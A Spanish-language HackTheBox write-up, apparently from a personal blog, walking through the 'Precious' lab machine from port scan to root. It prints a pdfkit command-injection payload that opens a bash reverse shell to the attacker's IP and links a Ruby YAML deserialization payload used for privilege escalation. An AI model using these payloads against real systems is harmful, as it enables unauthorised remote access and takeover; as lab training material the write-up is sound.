# Primeros pasos

En este artículo voy a subir mi writeup vulnerando la máquina Precious del sitio web HackTheBox. Voy a ir paso a paso explicando poco a poco los pasos que voy realizando. He estado entrando e investigando y después de un par de días intentandolo resolver por mi mismo, traigo esta writeup para poder coger la flag, o bandera y así completar esta máquina. 

# Materiales

En esta máquina recomiendo tener un sistema operativo Linux, conectarnos a la VPN de HTB y tener nociones sobre herramientas básicas de pentesting.

# Resolución Máquina Precious

- Cuando hayamos accedido a la VPN, haremos ping para ver si llegamos a la máquina con una traza ICMP

<img src="/assets/cybersecurity/writeups/Precious/1.png"/>

- Ahora que vemos que tenemos conexión, vamos a realizar un escaneo de los puertos de la máquina con Nmap (puedes encontrar un tutorial sobre esta herramienta en mi blog). Cómo podemos comprobar, tenemos abiertos los puertos 22/tcp y 80/tcp. El 22/tcp corresponde al servicio ssh y al 80/tcp pertenece al servicio http.

<img src="/assets/cybersecurity/writeups/Precious/2.png"/>

- Voy a editar el archivo /etc/hosts y añadir la siguiente información

<img src="/assets/cybersecurity/writeups/Precious/3.png"/>

- Y usaré el comando curl con la dirección http://precious.htb

<img src="/assets/cybersecurity/writeups/Precious/4.png"/>

- Ahora, si abrimos nuestro navegador de confianza, podremos ver la siguiente página web, un convertidor de web a pdf

<img src="/assets/cybersecurity/writeups/Precious/5.png"/>

- Ahora necesitaremos crear un servidor con python para ver si podemos realizar algunas peticiones. Tranquil@, no necesitas saber este lenguaje para este ejercicio, ya que es un comando muy sencillo

<img src="/assets/cybersecurity/writeups/Precious/6.png"/>

- Ahora, nos metemos en la web y en el buscador vamos a apuntar a nuestro servidor http que hemos creado de la siguiente manera, usando la ip que nos ha asignado la vpn

<img src="/assets/cybersecurity/writeups/Precious/7.png"/>

- Cómo podemos ver, nos llega una petición a nuestro servicio http, además nos descarga un documento pdf

<img src="/assets/cybersecurity/writeups/Precious/8.png"/>

- A continuación necesitaremos una herramienta llamada exiftool que nos dará información avanzada sobre un archivo pdf, lo usaremos para ver esa información del archivo pdf descargado. La instalaremos fácilmente de la siguiente manera

<img src="/assets/cybersecurity/writeups/Precious/9.png"/>

- Vamos a cambiar el nombre del archivo y le pondremos precious.pdf, y vamos a analizarlo

<img src="/assets/cybersecurity/writeups/Precious/10.png"/>


- Oh vaya, ha sido genereado con pdfkit v0.8.6. Es hora de llegar a la parte divertida, crear una reverse shell. Voy a crear una injección, en este artículo puedes encontrar este payload de la página [Snyk vulnerability DB](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795). Con él vamos a realizar un exploit muy sencillo usando el convertidor que tiene la página http precious de la siguiente manera. Primero vamos a escuchar por netcat por el puerto 443:

<img src="/assets/cybersecurity/writeups/Precious/11.png"/>

- A continuación, añadimos el siguiente comando

```
http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/"TuIP"/443 0>&1"`'}
```
<img src="/assets/cybersecurity/writeups/Precious/12.png"/>

- Cómo podemos observar, ya tenemos completo acceso a la máquina

<img src="/assets/cybersecurity/writeups/Precious/13.png"/>

- He navegado por los directorios, y específiamente en ~/.bundle tenemos información relevante sobre un usuario llamado henry. ¿Qué puertos tenemos abiertos en esta máquina además del servicio HTTP? correcto, el servicio SSH. Vamos a probar acceso al usuario henry por ssh haber si tenemos acceso con las credenciales obtenidas

<img src="/assets/cybersecurity/writeups/Precious/14.png"/>

Voy a iniciar sesión con el usuario henry, cómo podemos ver, usamos las credenciales y conseguimos acceso total al usuario

<img src="/assets/cybersecurity/writeups/Precious/15.png"/>

- Ya tenemos acceso a la máquina con el usuario henry y con esto ya tenemos la primera flag, la obtendremos de la siguiente manera

<img src="/assets/cybersecurity/writeups/Precious/16.png"/>

- Apuntamos esta flag en un archivo txt para más adelante agregarla en HTB y así obtener la flag del usuario. Continuamos mirando los permisos de sudoers, en él podemos ver que podemos ejecutar un archivo de ruby como root. Si leemos el archivo podemos comprobar que en una parte intenta cargar a dependencies.yml Podrás comprobar lo mencionado en la siguiente captura

<img src="/assets/cybersecurity/writeups/Precious/17.png"/>

- Con el siguiente payload vamos a ejecutar un comando para realizar la bash suid (son permisos de acceso que pueden asignarse a archivos o directorios en un sistema operativo basado en Unix. Se suele utilizar para permitir a los usuarios del sistema ejecutar binarios con privilegios elevados temporalmente para realizar una tarea en específico.) [Pincha aquí para obtener el payload](https://gist.githubusercontent.com/staaldraad/89dffe369e1454eedd3306edc8a7e565/raw/4b85e6fe8f5708f0a7ba87dbecb6954f8f380bee/ruby_yaml_load_sploit2.yaml). Yo lo he copiado y pegado en un archivo que me he hecho en el escritorio, además cambiaremos el git_set, cómo podemos ver en la captura: 

<img src="/assets/cybersecurity/writeups/Precious/18.png"/>

- Ahora introducimos el siguiente comando

<img src="/assets/cybersecurity/writeups/Precious/20.png"/>

- Introducimos el último comando y cómo podemos comprobar, ya tenemos acceso a root

<img src="/assets/cybersecurity/writeups/Precious/21.png"/>

- Ejecutamos los siguientes comandos y terminamos la recopilar las flags

<img src="/assets/cybersecurity/writeups/Precious/22.png"/>

- Cómo podemos ver, ya tenemos la máquina totalmente pwneada

<img src="/assets/cybersecurity/writeups/Precious/23.png"/>



































